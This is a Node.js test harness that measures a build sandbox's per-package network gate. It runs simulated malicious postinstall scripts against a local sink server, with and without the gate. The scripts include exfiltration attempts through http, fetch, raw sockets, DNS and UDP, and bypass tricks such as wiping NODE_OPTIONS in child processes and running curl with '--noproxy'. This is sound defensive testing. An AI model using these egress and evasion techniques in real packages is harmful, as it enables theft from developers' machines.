// Measures the build jail's per-package network gate (`net_gate_shim.js`) end to end, through
// the SAME delivery channel production uses: a percent-encoded `data:text/javascript` module on
// `NODE_OPTIONS=--import`.
//
// WHY THE SINK IS NOT ON LOOPBACK. The gate permits loopback by default (a build that starts a
// local server must keep working), so a sink on `127.0.0.1` would be ALLOWED and every arm would
// pass for the wrong reason. The sink therefore binds a real non-loopback interface address, so
// reaching it is shaped like genuine off-box egress. A dedicated arm covers loopback denial.
//
// WHY THE SINK COUNTS HITS. Each attacker script self-reports, but a self-report is not
// evidence — the authority is the SERVER seeing a request arrive. Every arm is judged on the
// sink's own hit count for that arm's unique path, so a "blocked" verdict means no byte arrived.
//
// Every arm runs twice: once with the gate and once WITHOUT (the control). A blocked arm means
// nothing unless the paired control shows the same exfiltration succeeding.

import http from "node:http";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";

// ⚠️ `spawnSync` CANNOT be used here, and using it produced a false result once. The sink server
// lives in THIS process, so a synchronous spawn blocks the event loop: the child's request is
// accepted by the kernel but the sink cannot RESPOND until the child has already exited, so the
// child times out, reports nothing, and the sink records the hit afterwards. Every arm then looks
// identical — which reads exactly like "the gate does nothing" — for a reason that has nothing to
// do with the gate. Async spawn keeps the loop free so the sink can answer while the child waits.
function runChild(code, env, timeout = 15000) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, ["-e", code], { env });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d) => (stdout += d));
    child.stderr.on("data", (d) => (stderr += d));
    const timer = setTimeout(() => child.kill("SIGKILL"), timeout);
    child.on("close", (status) => {
      clearTimeout(timer);
      resolve({ stdout: stdout.trim(), stderr: stderr.trim().split("\n")[0] || "", status });
    });
  });
}

const here = path.dirname(fileURLToPath(import.meta.url));
const SHIM = path.join(here, "..", "..", "crates", "nub-sandbox", "src", "backend", "net_gate_shim.js");

// Mirrors `percent_encode_strict` in compiler/defaults.rs: maximal encoding, because
// NODE_OPTIONS is split on whitespace and an under-encoded payload silently TRUNCATES the
// preload rather than failing loudly.
function encodeStrict(src) {
  let out = "";
  for (const byte of Buffer.from(src, "utf8")) {
    const c = String.fromCharCode(byte);
    if (/[A-Za-z0-9\-_.~]/.test(c)) out += c;
    else out += "%" + byte.toString(16).toUpperCase().padStart(2, "0");
  }
  return out;
}

function nodeOptionsFor(policy) {
  const js = fs.readFileSync(SHIM, "utf8").replace("__NUB_NET_POLICY_JSON__", JSON.stringify(policy));
  return `--import data:text/javascript,${encodeStrict(js)}`;
}

function lanAddress() {
  for (const addrs of Object.values(os.networkInterfaces()))
    for (const a of addrs) if (a.family === "IPv4" && !a.internal) return a.address;
  return null;
}

const HOST = lanAddress();
if (!HOST) {
  console.error("no non-loopback IPv4 interface: cannot build an honest control arm");
  process.exit(2);
}

const hits = new Map();
const sink = http.createServer((req, res) => {
  const tag = req.url.slice(1);
  hits.set(tag, (hits.get(tag) || 0) + 1);
  res.end("stolen");
});
await new Promise((r) => sink.listen(0, "0.0.0.0", r));
const PORT = sink.address().port;

// ── the attacker scripts ────────────────────────────────────────────────────────────────
// Each is what a freshly-published malicious postinstall hook plausibly looks like.
const scripts = {
  "https.get": `
    const http = require("node:http");
    http.get(process.env.SINK, (r) => { r.resume(); console.log("REACHED"); })
        .on("error", (e) => console.log("BLOCKED " + e.code + " " + (e.nubReason||"")));`,
  fetch: `
    fetch(process.env.SINK).then(() => console.log("REACHED"),
      (e) => console.log("BLOCKED " + (e.cause?.code||e.code||"?") + " " + (e.cause?.nubReason||"")));`,
  "net.connect": `
    const net = require("node:net");
    const s = net.connect(Number(process.env.PORT), process.env.HOST, () => {
      s.write("GET /" + process.env.TAG + " HTTP/1.0\\r\\n\\r\\n");
      setTimeout(() => { console.log("REACHED"); process.exit(0); }, 300);
    });
    s.on("error", (e) => console.log("BLOCKED " + e.code + " " + (e.nubReason||"")));`,
  // Resolves the sink's own literal address: `dns.lookup` answers an IP literal from memory, so
  // the control arm succeeds with no working external resolver. A real hostname made the CONTROL
  // arm fail too on an offline host, which destroys the differential.
  "dns.lookup": `
    require("node:dns").lookup(process.env.HOST, (e) =>
      console.log(e ? "BLOCKED " + e.code + " " + (e.nubReason||"") : "REACHED"));`,
  "dgram.send": `
    const s = require("node:dgram").createSocket("udp4");
    s.send("stolen", 9999, "8.8.8.8", (e) =>
      { console.log(e ? "BLOCKED " + e.code + " " + (e.nubReason||"") : "REACHED"); s.close(); });`,
  // The child-process cases: does the gate survive a spawn?
  "spawn node (inherit)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8" });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
  "spawn node (env wiped)": `
    const { spawnSync } = require("node:child_process");
    const env = { ...process.env }; delete env.NODE_OPTIONS;
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8", env });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
  "spawn curl (non-Node)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync("curl", ["-s", "-m", "5", process.env.SINK], { encoding: "utf8" });
    console.log(r.status === 0 && r.stdout ? "REACHED" : "BLOCKED curl-status-" + r.status);`,
  // The honest residual: a client that is TOLD to ignore proxy configuration. Expected to REACH
  // even under a full deny — recorded so the report cannot overstate what the tier buys.
  "spawn curl --noproxy": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync("curl", ["-s", "-m", "5", "--noproxy", "*", process.env.SINK], { encoding: "utf8" });
    console.log(r.status === 0 && r.stdout ? "REACHED" : "BLOCKED curl-status-" + r.status);`,
  // A script that hands the child a hand-built env, not a copy of its own.
  "spawn node (env replaced)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8", env: { SINK: process.env.SINK, PATH: process.env.PATH } });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
};

async function run(name, policy, tagSuffix) {
  const tag = `${name}-${tagSuffix}`.replace(/[^a-zA-Z0-9.-]/g, "_");
  const env = {
    ...process.env,
    SINK: `http://${HOST}:${PORT}/${tag}`,
    HOST,
    PORT: String(PORT),
    TAG: tag,
  };
  if (policy) env.NODE_OPTIONS = nodeOptionsFor(policy);
  else delete env.NODE_OPTIONS;
  return { tag, ...(await runChild(scripts[name], env)) };
}

// ── arms ────────────────────────────────────────────────────────────────────────────────
const DENIED = { package: "chalk", allow: false };
const ALLOWED = { package: "playwright", allow: true };

console.log(`sink: http://${HOST}:${PORT}  (non-loopback, so the loopback exemption cannot confound)`);
console.log(`node: ${process.version}  platform: ${process.platform}\n`);

const rows = [];
for (const name of Object.keys(scripts)) {
  const ctrl = await run(name, null, "control");
  const deny = await run(name, DENIED, "denied");
  const allow = await run(name, ALLOWED, "allowed");
  rows.push({ name, ctrl, deny, allow });
}
await new Promise((r) => setTimeout(r, 500)); // let in-flight sink writes land

const verdict = (r) => {
  const arrived = hits.get(r.tag) || 0;
  const said = /REACHED/.test(r.stdout) ? "REACHED" : /BLOCKED/.test(r.stdout) ? "BLOCKED" : "?";
  return { said, arrived, raw: r.stdout.split("\n").pop() || r.stderr };
};

const pad = (s, n) => String(s).padEnd(n);
console.log(pad("attack", 24) + pad("no-jail CONTROL", 22) + pad("allow:false", 22) + "allow:true");
console.log("-".repeat(92));
for (const { name, ctrl, deny, allow } of rows) {
  const c = verdict(ctrl), d = verdict(deny), a = verdict(allow);
  const cell = (v) => pad(`${v.said} (sink:${v.arrived})`, 22);
  console.log(pad(name, 24) + cell(c) + cell(d) + `${a.said} (sink:${a.arrived})`);
}
console.log("\n--- raw child output (so a '?' verdict is diagnosable, never guessed) ---");
for (const { name, ctrl, deny, allow } of rows) {
  console.log(`  ${name}`);
  for (const [label, r] of [["control", ctrl], ["deny   ", deny], ["allow  ", allow]]) {
    console.log(`      ${label}: rc=${r.status} out=${JSON.stringify(r.stdout.slice(0, 110))}${r.stderr ? " err=" + JSON.stringify(r.stderr.slice(0, 70)) : ""}`);
  }
}

console.log("\n--- denial messages seen under allow:false ---");
for (const { name, deny } of rows) {
  const line = deny.stdout.split("\n").pop();
  if (/BLOCKED/.test(line)) console.log(`  ${pad(name, 24)} ${line}`);
}

// ── loopback arm: the default exemption, and turning it off ─────────────────────────────
console.log("\n--- loopback (the default exemption) ---");
for (const [label, policy] of [
  ["allow:false, loopback default", { package: "chalk", allow: false }],
  ["allow:false, loopback:false", { package: "chalk", allow: false, loopback: false }],
]) {
  const env = { ...process.env, NODE_OPTIONS: nodeOptionsFor(policy) };
  const r = await runChild(
    `const net=require("node:net");const s=net.connect(${PORT},"127.0.0.1",()=>{console.log("REACHED");process.exit(0)});s.on("error",e=>console.log("BLOCKED "+e.code))`,
    env, 8000);
  console.log(`  ${pad(label, 32)} ${(r.stdout || r.stderr).split("\n").pop()}`);
}

// ── host refinement on a permitted package ─────────────────────────────────────────────
console.log("\n--- host allowlist refinement (allow:true + hosts) ---");
// Judged on the GATE's own decision, not on whether DNS then resolves — the arms below use
// unresolvable names on purpose, so `err.nubReason` is the only trustworthy discriminator
// between "the gate denied it" and "the resolver failed".
for (const [label, hosts, target, expect] of [
  ["exact host match", [HOST], HOST, "allow"],
  ["host NOT in list", ["nodejs.org"], HOST, "deny"],
  ["subdomain via wildcard", ["*.example.com"], "cdn.example.com", "allow"],
  ["wildcard must not match apex", ["*.example.com"], "example.com", "deny"],
  ["wildcard partial-label guard", ["*.example.com"], "evilexample.com", "deny"],
]) {
  const env = { ...process.env, NODE_OPTIONS: nodeOptionsFor({ package: "playwright", allow: true, hosts }) };
  const r = await runChild(
    `require("node:dns").lookup(${JSON.stringify(target)},e=>console.log(e?(e.nubReason==="ERR_NUB_JAIL_NET_DENIED"?"GATE-DENIED":"passed-gate(resolver said "+e.code+")"):"GATE-ALLOWED"))`,
    env, 8000);
  const out = (r.stdout || r.stderr).split("\n").pop();
  const got = /GATE-DENIED/.test(out) ? "deny" : "allow";
  console.log(`  ${pad(label, 30)} hosts=${pad(JSON.stringify(hosts), 20)} target=${pad(target, 18)} ${got === expect ? "PASS" : "**FAIL**"}  (${out})`);
}

sink.close();
